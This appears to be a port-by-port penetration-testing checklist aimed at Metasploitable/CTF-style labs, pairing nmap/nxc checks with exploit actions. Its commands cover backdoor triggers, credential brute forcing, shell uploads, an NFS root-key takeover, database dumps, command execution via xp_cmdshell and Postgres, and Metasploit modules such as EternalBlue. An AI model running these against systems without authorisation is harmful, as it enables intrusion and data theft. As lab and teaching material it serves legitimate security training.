# ğŸ›¡ï¸ Ultimate Network Pentesting Checklist (Refined)

## ğŸ¯ How to Use
1.  **Scan** the target.
2.  **Execute** the "Check Command".
3.  If the check succeeds, you have found the **Vulnerability** listed below it.
4.  **Execute** the "Exploit/Action" to capitalize on it.

---

## ğŸ“‚ File Transfer & Remote Access

### 21 / 2121 - FTP
**Tools:** `nxc`, `nmap`, `ftp`, `nc`

- [ ] **Check 1: Anonymous Access**
    ```bash
    nxc ftp <TARGET_IP> -u 'anonymous' -p 'anonymous'
    # OR
    ftp <TARGET_IP>
    ```
    - **ğŸ”» Vuln Found:** `Anonymous FTP Access`
        - **Action:** List files (`ls -la`), download sensitive data (`get file`), or try to upload (`put shell.php`).

- [ ] **Check 2: Version Enumeration**
    ```bash
    nmap -sV -p 21 <TARGET_IP>
    ```
    - **ğŸ”» Vuln Found:** `vsftpd 2.3.4 Backdoor`
        - **Action:**
          ```bash
          # Term 1: Trigger Backdoor
          telnet <TARGET_IP> 21
          user: user:)
          pass: pass
          # Term 2: Connect to Shell
          nc <TARGET_IP> 6200
          ```
    - **ğŸ”» Vuln Found:** `ProFTPD 1.3.1 (RCE)`
        - **Action:** Use Metasploit `exploit/linux/ftp/proftp_sreplace` or `searchsploit` scripts.

- [ ] **Check 3: Brute Force**
    ```bash
    nxc ftp <TARGET_IP> -u user.txt -p pass.txt
    ```
    - **ğŸ”» Vuln Found:** `Weak FTP Credentials`
        - **Action:** Log in and look for flags or upload shells.

### 22 - SSH
**Tools:** `nxc`, `ssh-audit`, `hydra`

- [ ] **Check 1: Configuration Audit**
    ```bash
    ssh-audit <TARGET_IP>
    ```
    - **ğŸ”» Vuln Found:** `Weak SSH Algorithms / Ciphers`
        - **Action:** Report as finding (low/medium severity).

- [ ] **Check 2: Brute Force**
    ```bash
    nxc ssh <TARGET_IP> -u root -p /usr/share/wordlists/rockyou.txt
    ```
    - **ğŸ”» Vuln Found:** `Weak SSH Credentials`
        - **Action:** `ssh root@<TARGET_IP>`

### 23 - Telnet
**Tools:** `telnet`, `hydra`

- [ ] **Check 1: No-Auth Login**
    ```bash
    telnet <TARGET_IP>
    ```
    - **ğŸ”» Vuln Found:** `Unauthenticated Telnet Access`
        - **Action:** You are in. Run `id`.

- [ ] **Check 2: Cleartext Sniffing**
    ```bash
    # (If on same LAN)
    tcpdump -i eth0 port 23 -A
    ```
    - **ğŸ”» Vuln Found:** `Cleartext Credentials Leaked`
        - **Action:** Capture username/password.

### 512, 513, 514 - R-Services
**Tools:** `rlogin`, `rsh`

- [ ] **Check 1: Remote Login**
    ```bash
    rlogin -l root <TARGET_IP>
    ```
    - **ğŸ”» Vuln Found:** `Misconfigured Rlogin (Trust Relationship)`
        - **Action:** You are root.

- [ ] **Check 2: Remote Shell**
    ```bash
    rsh -l root <TARGET_IP> whoami
    ```
    - **ğŸ”» Vuln Found:** `Unprotected Rsh`
        - **Action:** You are root.

### 3389 - RDP
**Tools:** `nxc`, `nmap`

- [ ] **Check 1: BlueKeep Vulnerability**
    ```bash
    nmap -p 3389 --script rdp-vuln-ms12-020,rdp-ntlm-info <TARGET_IP>
    ```
    - **ğŸ”» Vuln Found:** `BlueKeep (CVE-2019-0708)`
        - **Action:** Use Metasploit `exploit/windows/rdp/cve_2019_0708_bluekeep_rce`.

- [ ] **Check 2: Credential Spraying**
    ```bash
    nxc rdp <TARGET_IP> -u users.txt -p 'Password123!'
    ```
    - **ğŸ”» Vuln Found:** `Weak RDP Credentials`
        - **Action:** `xfreerdp /v:<TARGET_IP> /u:user /p:pass`

### 5985 / 5986 - WinRM
**Tools:** `nxc`, `evil-winrm`

- [ ] **Check 1: Brute Force**
    ```bash
    nxc winrm <TARGET_IP> -u users.txt -p pass.txt
    ```
    - **ğŸ”» Vuln Found:** `Weak WinRM Credentials`
        - **Action:** `evil-winrm -i <TARGET_IP> -u <USER> -p <PASS>`

---

## ğŸŒ Web & Mail

### 80 / 443 / 8180 - HTTP
**Tools:** `gobuster`, `nikto`, `davtest`

- [ ] **Check 1: WebDAV Configuration**
    ```bash
    davtest -url http://<TARGET_IP>
    ```
    - **ğŸ”» Vuln Found:** `Unrestricted File Upload (WebDAV)`
        - **Action:** `cadaver http://<TARGET_IP>` -> `put shell.php`

- [ ] **Check 2: Tomcat Manager**
    ```bash
    # Check http://<TARGET_IP>:8180/manager/html
    nxc http <TARGET_IP> --port 8180 -u tomcat -p tomcat
    ```
    - **ğŸ”» Vuln Found:** `Default Tomcat Credentials`
        - **Action:** Upload a `.war` reverse shell via the GUI.

- [ ] **Check 3: CGI/Shellshock**
    ```bash
    nmap -sV -p 80 --script http-shellshock <TARGET_IP>
    ```
    - **ğŸ”» Vuln Found:** `Shellshock (CVE-2014-6271)`
        - **Action:** Use Metasploit `exploit/multi/http/apache_mod_cgi_bash_env_exec`.

### 8009 - AJP13
**Tools:** `searchsploit`

- [ ] **Check 1: Ghostcat**
    ```bash
    nmap -p 8009 --script ajp-auth,ajp-headers,ajp-methods,ajp-request <TARGET_IP>
    ```
    - **ğŸ”» Vuln Found:** `Ghostcat (CVE-2020-1938)`
        - **Action:** Read configuration files or source code using `ghostcat.py`.

---

## ğŸ“‚ Shares & SMB

### 139 / 445 - SMB
**Tools:** `nxc`, `smbclient`, `enum4linux`

- [ ] **Check 1: Null Session / Anonymous**
    ```bash
    nxc smb <TARGET_IP> -u '' -p '' --shares
    ```
    - **ğŸ”» Vuln Found:** `Anonymous SMB Access`
        - **Action:** Browse shares: `smbclient //<TARGET_IP>/<SHARE> -N`.

- [ ] **Check 2: Critical SMB Exploits**
    ```bash
    nmap -p 445 --script smb-vuln* <TARGET_IP>
    ```
    - **ğŸ”» Vuln Found:** `Samba Symlink Directory Traversal`
        - **Action:** Access root filesystem via symlink (Metasploit).
    - **ğŸ”» Vuln Found:** `MS17-010 (EternalBlue)`
        - **Action:** Use `exploit/windows/smb/ms17_010_eternalblue`.

- [ ] **Check 3: Samba 3.x Exploit**
    - **ğŸ”» Vuln Found:** `Samba "Usermap Script" (CVE-2007-2447)`
        - **Action:** Use `exploit/multi/samba/usermap_script`.

- [ ] **Check 4: Brute Force / Spray**
    ```bash
    nxc smb <TARGET_IP> -u users.txt -p pass.txt --continue-on-success
    ```
    - **ğŸ”» Vuln Found:** `Weak SMB Credentials`
        - **Action:** `psexec.py user:pass@<TARGET_IP>`

### 111 / 2049 - NFS
**Tools:** `showmount`

- [ ] **Check 1: Export Enumeration**
    ```bash
    showmount -e <TARGET_IP>
    ```
    - **ğŸ”» Vuln Found:** `NFS No_Root_Squash`
        - **Action:** Mount `/`, drop SSH key into `/root/.ssh/authorized_keys`, SSH in as root.

---

## ğŸ—„ï¸ Databases

### 1433 - MSSQL
**Tools:** `nxc`, `impacket`

- [ ] **Check 1: Default/Weak Creds**
    ```bash
    nxc mssql <TARGET_IP> -u sa -p 'password' --local-auth
    ```
    - **ğŸ”» Vuln Found:** `Weak MSSQL Credentials`
        - **Action:** `impacket-mssqlclient sa:password@<TARGET_IP>`.

- [ ] **Check 2: Command Execution**
    ```bash
    # Once connected via mssqlclient
    xp_cmdshell whoami
    ```
    - **ğŸ”» Vuln Found:** `xp_cmdshell Enabled`
        - **Action:** Execute system commands.

### 3306 - MySQL
**Tools:** `mysql`, `hydra`

- [ ] **Check 1: Empty Root Password**
    ```bash
    mysql -u root -h <TARGET_IP>
    # Press Enter
    ```
    - **ğŸ”» Vuln Found:** `MySQL Empty Password`
        - **Action:** Dump database `mysqldump -u root -h <TARGET_IP> --all-databases > dump.sql`.

### 5432 - PostgreSQL
**Tools:** `psql`

- [ ] **Check 1: Default Creds**
    ```bash
    psql -h <TARGET_IP> -U postgres
    ```
    - **ğŸ”» Vuln Found:** `Postgres Default Creds`
        - **Action:** `COPY cmd_exec FROM PROGRAM 'id';`

---

## ğŸ’€ Special Ports (Metasploitable/CTF)

### 1524 - Bindshell
- [ ] **Check 1: Connection**
    ```bash
    nc <TARGET_IP> 1524
    ```
    - **ğŸ”» Vuln Found:** `Open Root Bindshell`
        - **Action:** You are root.

### 6667 - IRC
- [ ] **Check 1: Version Check**
    ```bash
    nmap -sV -p 6667 <TARGET_IP>
    ```
    - **ğŸ”» Vuln Found:** `UnrealIRCd 3.2.8.1 Backdoor`
        - **Action:** Use `exploit/unix/irc/unreal_ircd_3281_backdoor`.

### 1099 - Java RMI
- [ ] **Check 1: RMI Registry**
    ```bash
    nmap -sV -p 1099 --script rmi-vuln-classloader <TARGET_IP>
    ```
    - **ğŸ”» Vuln Found:** `Insecure Java RMI Server`
        - **Action:** Use `exploit/multi/misc/java_rmi_server`.